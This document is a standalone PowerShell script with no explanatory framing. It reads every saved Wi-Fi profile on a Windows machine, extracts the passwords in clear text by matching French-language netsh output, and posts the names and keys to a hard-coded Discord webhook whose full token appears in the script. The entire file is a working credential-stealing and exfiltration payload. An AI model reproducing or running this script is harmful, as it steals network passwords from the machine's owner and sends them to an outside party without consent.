$webhook = "https://discord.com/api/webhooks/1244988285101801532/2gT9NpiOuMyELp5791kvlBzuGtKpDiDRzdUZYWh0VsTGUotThz44Tt8SxQzOmk2ddnHM"

# Get all Wi-Fi profiles
$profiles = netsh wlan show profiles | Select-String ":\s(.+)$" | ForEach-Object {
    $_.Matches.Groups[1].Value.Trim()
}

$results = @()

# Iterate over each Wi-Fi profile to extract profile details
foreach ($profile in $profiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear

    # Extract the password
    $password = ($profileDetails | Select-String "Contenu de la cl√©\W+\:\s(.+)$").Matches.Groups[1].Value.Trim()

    # Create a custom object with profile name and password
    $result = [PSCustomObject]@{
        PROFILE_NAME = $profile
        PASSWORD = $password
    }

    $results += $result
}

# Convert results to JSON
$body = @{
    content = ($results | Format-Table -AutoSize | Out-String).Trim()
} | ConvertTo-Json

# Send the JSON payload to the Discord webhook
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
